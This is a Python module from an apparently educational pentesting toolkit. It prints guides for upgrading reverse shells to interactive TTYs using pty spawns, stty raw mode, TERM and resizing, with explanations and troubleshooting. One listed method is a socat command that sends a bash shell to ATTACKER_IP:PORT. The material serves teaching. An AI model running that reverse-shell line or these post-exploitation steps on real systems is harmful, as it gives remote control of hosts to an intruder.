"""
TTY upgrade functionality for stabilizing reverse shells
"""

import subprocess
from typing import Dict, List, Optional
from learnshells.utils.logger import Logger
from learnshells.utils.colors import Colors


class TTYUpgrader:
    """Upgrade basic shells to fully interactive TTY."""
    
    def __init__(self, logger: Logger = None):
        """
        Initialize TTY upgrader.
        
        Args:
            logger: Logger instance
        """
        self.logger = logger or Logger()
        self.target_os = "linux"  # linux or windows
    
    def get_upgrade_commands(self, method: str = "python3") -> Dict[str, str]:
        """
        Get commands for upgrading shell to full TTY.
        
        Args:
            method: Upgrade method (python3, python, script, perl, etc.)
            
        Returns:
            Dict of step: command
        """
        methods = {
            "python3": {
                "step1_spawn": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
                "step2_background": "^Z (Ctrl+Z)",
                "step3_configure": "stty raw -echo; fg",
                "step4_term": "export TERM=xterm",
                "step5_resize": "stty rows 38 columns 116"
            },
            "python": {
                "step1_spawn": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
                "step2_background": "^Z (Ctrl+Z)",
                "step3_configure": "stty raw -echo; fg",
                "step4_term": "export TERM=xterm",
                "step5_resize": "stty rows 38 columns 116"
            },
            "script": {
                "step1_spawn": "script -qc /bin/bash /dev/null",
                "step2_background": "^Z (Ctrl+Z)",
                "step3_configure": "stty raw -echo; fg",
                "step4_term": "export TERM=xterm",
                "step5_resize": "stty rows 38 columns 116"
            },
            "perl": {
                "step1_spawn": "perl -e 'exec \"/bin/bash\"'",
                "step2_background": "^Z (Ctrl+Z)",
                "step3_configure": "stty raw -echo; fg",
                "step4_term": "export TERM=xterm",
                "step5_resize": "stty rows 38 columns 116"
            },
            "socat": {
                "step1_note": "Socat provides full TTY automatically - no upgrade needed!",
                "step2_check": "echo $TERM  # Should show a terminal type",
                "step3_resize": "stty rows 38 columns 116  # Optional: fix size"
            }
        }
        
        return methods.get(method, methods["python3"])
    
    def display_upgrade_guide(self, method: str = "python3"):
        """
        Display step-by-step TTY upgrade guide.
        
        Args:
            method: Upgrade method to use
        """
        self.logger.header("TTY Upgrade Guide")
        
        if method == "socat":
            self.logger.success("Socat shells already have full TTY! No upgrade needed.")
            self.logger.info("You can skip this entire process.")
            return
        
        commands = self.get_upgrade_commands(method)
        
        self.logger.educational_note(
            "Why Upgrade to TTY?",
            "Basic reverse shells are limited:\n"
            "✗ No tab completion\n"
            "✗ No arrow key history\n"
            "✗ Ctrl+C kills the shell\n"
            "✗ Text editors don't work\n"
            "✗ No proper terminal rendering\n\n"
            "Full TTY gives you:\n"
            "✓ Tab completion\n"
            "✓ Arrow key navigation\n"
            "✓ Ctrl+C works properly\n"
            "✓ vim/nano work perfectly\n"
            "✓ Colors and formatting\n"
            "✓ Proper signal handling"
        )
        
        self.logger.subheader(f"Method: {method.upper()}")
        
        # Step 1: Spawn PTY
        self.logger.numbered_item(1, "Spawn a Pseudo-Terminal (PTY)")
        self.logger.info("In your shell, run:")
        self.logger.command(commands.get("step1_spawn", ""))
        self.logger.info("This creates a pseudo-terminal that behaves like a real terminal.")
        self.logger.newline()
        
        # Step 2: Background
        self.logger.numbered_item(2, "Background the shell")
        self.logger.info("Press: Ctrl+Z")
        self.logger.info("This backgrounds the shell process so you can configure your terminal.")
        self.logger.newline()
        
        # Step 3: Configure terminal
        self.logger.numbered_item(3, "Configure terminal for raw input")
        self.logger.info("In your local terminal, run:")
        self.logger.command(commands.get("step3_configure", ""))
        self.logger.info("This disables local echo and brings the shell back to foreground.")
        self.logger.warning("Note: You won't see your typing after this - it's normal!")
        self.logger.newline()
        
        # Step 4: Set terminal type
        self.logger.numbered_item(4, "Set terminal type")
        self.logger.info("In the shell (you won't see typing):")
        self.logger.command(commands.get("step4_term", ""))
        self.logger.info("This tells the shell what kind of terminal you're using.")
        self.logger.newline()
        
        # Step 5: Fix terminal size
        self.logger.numbered_item(5, "Fix terminal size (optional)")
        self.logger.info("Get your terminal size:")
        self.logger.command("stty size  # Run this in YOUR terminal first")
        self.logger.info("Then in the shell:")
        self.logger.command(commands.get("step5_resize", ""))
        self.logger.info("Adjust rows and columns to match your terminal.")
        self.logger.newline()
        
        # Success message
        self.logger.results(True, "TTY upgrade complete! You now have a fully interactive shell.")
        
        # Test commands
        self.logger.tip("Test your upgraded shell:")
        self.logger.list_item("Try tab completion: cd /et<TAB>")
        self.logger.list_item("Try arrow keys: Press UP arrow for history")
        self.logger.list_item("Try Ctrl+C: Start a command and press Ctrl+C (should cancel, not kill shell)")
        self.logger.list_item("Try vim: vim test.txt")
    
    def get_pty_spawn_methods(self) -> List[Dict[str, str]]:
        """
        Get all available methods for spawning PTY.
        
        Returns:
            List of method dictionaries
        """
        methods = [
            {
                "name": "Python 3",
                "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
                "availability": "Common on modern Linux",
                "priority": 1
            },
            {
                "name": "Python 2",
                "command": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
                "availability": "Legacy systems",
                "priority": 2
            },
            {
                "name": "Script",
                "command": "script -qc /bin/bash /dev/null",
                "availability": "Almost all Linux systems",
                "priority": 3
            },
            {
                "name": "Perl",
                "command": "perl -e 'exec \"/bin/bash\"'",
                "availability": "Many Linux systems",
                "priority": 4
            },
            {
                "name": "Socat",
                "command": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:PORT",
                "availability": "If socat is installed",
                "priority": 5
            },
            {
                "name": "Expect",
                "command": "expect -c 'spawn /bin/bash; interact'",
                "availability": "Rare, but powerful",
                "priority": 6
            }
        ]
        
        return sorted(methods, key=lambda x: x["priority"])
    
    def detect_available_methods(self) -> List[str]:
        """
        Detect which PTY spawn methods are available on target.
        
        Returns:
            List of available method names
        """
        self.logger.info("Detecting available PTY spawn methods...")
        
        # Commands to check
        checks = {
            "python3": "which python3",
            "python": "which python",
            "script": "which script",
            "perl": "which perl",
            "socat": "which socat",
            "expect": "which expect"
        }
        
        available = []
        
        # Note: This would need to be run on the target shell
        # For now, return a priority order
        self.logger.info("Try methods in this order:")
        
        for method in self.get_pty_spawn_methods():
            self.logger.list_item(f"{method['name']}: {method['availability']}")
            available.append(method['name'].lower().replace(' ', ''))
        
        return available
    
    def explain_tty_upgrade(self) -> str:
        """Explain what TTY upgrade is and why it's needed."""
        explanation = """
🎓 TTY UPGRADE EXPLAINED:

What is TTY?
TTY stands for "TeleTYpewriter" - a historical term for
terminals. In modern systems, a TTY is a text input/output
interface that programs use to interact with users.

What is a PTY?
PTY stands for "Pseudo-Terminal" or "Pseudo-TTY".
It's a software emulation of a physical terminal.
PTYs allow programs to think they're talking to a real terminal.

Why Basic Shells Are Limited:
When you get a reverse shell, you're connected via a raw socket.
The shell doesn't know it's connected to a terminal, so it runs
in non-interactive mode with limited features.

Without TTY (Basic Shell):
┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│  You Type   │────▶│   Socket    │────▶│   Shell     │
└─────────────┘     └─────────────┘     └─────────────┘
• No tab completion (shell doesn't know to complete)
• No arrow keys (they send escape codes, not recognized)
• Ctrl+C kills shell (signal goes to nc, not shell)
• No colors (shell doesn't think terminal supports them)
• Programs detect non-interactive and behave differently

With TTY (Upgraded Shell):
┌─────────────┐     ┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│  You Type   │────▶│   Socket    │────▶│     PTY     │────▶│   Shell     │
└─────────────┘     └─────────────┘     └─────────────┘     └─────────────┘
• PTY handles terminal emulation
• Shell thinks it's in interactive mode
• All features work as expected

The Upgrade Process Breakdown:

STEP 1: Spawn PTY
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    
    What happens:
    • Python's pty module creates a pseudo-terminal
    • It spawns /bin/bash inside this PTY
    • Bash now thinks it's in a real terminal
    • You get tab completion and basic features
    
    BUT: Your local terminal still in line-buffered mode
    Ctrl+C still kills your netcat listener!

STEP 2: Background Shell
    Press Ctrl+Z
    
    What happens:
    • Sends SIGTSTP signal to shell
    • Shell process stops and goes to background
    • You get your local terminal prompt back
    • Now you can configure your terminal

STEP 3: Configure Local Terminal
    stty raw -echo; fg
    
    What happens:
    • stty raw: Disables line buffering, sends every key immediately
    • -echo: Stops local echo (shell will echo back)
    • fg: Brings backgrounded shell to foreground
    
    Why this matters:
    • Raw mode sends Ctrl+C to shell (not netcat)
    • No echo prevents double characters
    • Now Ctrl+C works properly in shell!

STEP 4: Set Terminal Type
    export TERM=xterm
    
    What happens:
    • Tells shell what terminal capabilities you have
    • Shell uses this for colors, cursor movement, etc.
    • Programs check TERM to enable features
    
    Common TERM values:
    • xterm: Standard, widely compatible
    • xterm-256color: Full color support
    • screen: For screen/tmux sessions

STEP 5: Fix Terminal Size
    stty rows 38 columns 116
    
    What happens:
    • Tells PTY your actual terminal dimensions
    • Programs use this for formatting output
    • Fixes text editors, less, top, etc.
    
    Get your size: Run 'stty size' in YOUR terminal

Why Each Step Matters:

Without Step 1 (PTY spawn):
✗ No interactive features at all
✗ Everything is still very basic

Without Step 3 (raw mode):
✗ Ctrl+C kills your listener
✗ Line buffering delays input
✗ Terminal control sequences don't work

Without Step 4 (TERM):
✗ No colors
✗ Programs may crash or behave oddly
✗ Terminal capabilities unknown

Without Step 5 (size):
✗ Text wraps incorrectly
✗ Editors use wrong dimensions
✗ Output formatting broken

Alternative: Use Socat
Socat automatically handles all of this!
It creates a PTY with proper settings immediately.
No manual upgrade needed.

Common Issues:

Issue: "No module named pty"
Fix: Try script or perl method instead

Issue: Can't see typing after 'stty raw'
Fix: This is NORMAL! Just type blind, it's working

Issue: Ctrl+C still kills shell
Fix: Did you run 'stty raw'? Make sure raw mode is active

Issue: Wrong terminal size
Fix: Get size with 'stty size' in YOUR terminal, then set in shell

Pro Tips:
• Always use Ctrl+Z (not Ctrl+C) to background
• Set TERM before running text editors
• Adjust size before using top/htop
• If upgrade fails, you can still use basic shell
• Consider using socat to skip this entirely!
"""
        return explanation
    
    def generate_oneliner_upgrade(self, method: str = "python3") -> str:
        """
        Generate one-liner command for quick TTY upgrade.
        
        Args:
            method: Method to use
            
        Returns:
            One-liner command string
        """
        oneliners = {
            "python3": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'; export TERM=xterm",
            "python": "python -c 'import pty; pty.spawn(\"/bin/bash\")'; export TERM=xterm",
            "script": "script -qc /bin/bash /dev/null; export TERM=xterm"
        }
        
        return oneliners.get(method, oneliners["python3"])
    
    def troubleshoot_tty_upgrade(self):
        """Help troubleshoot TTY upgrade issues."""
        self.logger.header("TTY Upgrade Troubleshooting")
        
        issues = [
            {
                "problem": "python: No module named pty",
                "solution": "Try different method: script -qc /bin/bash /dev/null",
                "explanation": "PTY module not available, use script utility instead"
            },
            {
                "problem": "Can't see what I'm typing after 'stty raw'",
                "solution": "This is NORMAL! Type blind, it's working correctly",
                "explanation": "Raw mode disables local echo - the shell echoes back"
            },
            {
                "problem": "Ctrl+C still kills the shell",
                "solution": "Make sure you ran: stty raw -echo; fg",
                "explanation": "Raw mode must be active to pass Ctrl+C to shell"
            },
            {
                "problem": "Shell froze after backgrounding",
                "solution": "Type: fg (then Enter) to bring it back",
                "explanation": "Shell is just backgrounded, not dead"
            },
            {
                "problem": "Text wrapping incorrectly",
                "solution": "Set terminal size: stty rows 38 columns 116",
                "explanation": "PTY doesn't know your terminal dimensions"
            },
            {
                "problem": "vim/nano crashes or looks weird",
                "solution": "Set TERM: export TERM=xterm",
                "explanation": "Editor needs to know terminal capabilities"
            },
            {
                "problem": "Colors not working",
                "solution": "export TERM=xterm-256color",
                "explanation": "Need terminal type that supports colors"
            },
            {
                "problem": "Lost shell during upgrade",
                "solution": "Reconnect and try again, or use simpler method",
                "explanation": "Upgrade process can be fragile on unstable connections"
            }
        ]
        
        for item in issues:
            self.logger.error(f"❌ Problem: {item['problem']}")
            self.logger.success(f"   ✓ Solution: {item['solution']}")
            self.logger.info(f"   → Why: {item['explanation']}")
            self.logger.newline()
        
        self.logger.tip(
            "If TTY upgrade keeps failing:\n"
            "  • Use socat instead (provides full TTY automatically)\n"
            "  • Check if python/script are available on target\n"
            "  • Work with basic shell - many commands still work\n"
            "  • Ensure connection is stable before upgrading"
        )
    
    def get_terminal_size(self) -> tuple:
        """
        Get current terminal size.
        
        Returns:
            Tuple of (rows, columns)
        """
        try:
            result = subprocess.run(
                ['stty', 'size'],
                capture_output=True,
                text=True,
                timeout=2
            )
            rows, cols = result.stdout.strip().split()
            return (int(rows), int(cols))
        except Exception:
            return (38, 116)  # Default size
    
    def generate_resize_command(self) -> str:
        """Generate command to resize PTY to match current terminal."""
        rows, cols = self.get_terminal_size()
        return f"stty rows {rows} columns {cols}"
